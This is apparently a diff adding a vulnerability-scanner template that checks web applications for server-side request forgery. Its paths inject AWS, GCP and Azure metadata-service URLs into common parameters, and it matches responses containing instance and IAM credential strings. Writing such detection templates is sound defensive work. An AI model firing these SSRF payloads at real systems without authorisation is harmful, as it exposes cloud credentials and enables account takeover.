@@ -1,0 +1,61 @@
+id: generic-cloud-metadata-ssrf
+
+info:
+  name: Cloud Metadata SSRF Detection (AWS/GCP/Azure)
+  author: pt-zenity
+  severity: critical
+  description: |
+    Tests for Server-Side Request Forgery (SSRF) via common parameters that
+    redirect requests to cloud metadata services. If exploited, attackers
+    can access AWS IAM credentials, GCP service account tokens, Azure managed
+    identity tokens, and other sensitive instance metadata.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-918
+  tags: ssrf,cloud,aws,gcp,azure,critical,metadata
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?fetch=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/proxy?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-01-01"
+
+    stop-at-first-match: false
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "local-ipv4"
+          - "iam/security-credentials"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "project-id"
+          - "computeMetadata"
+          - "serviceAccounts"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "vmName"
+        condition: or
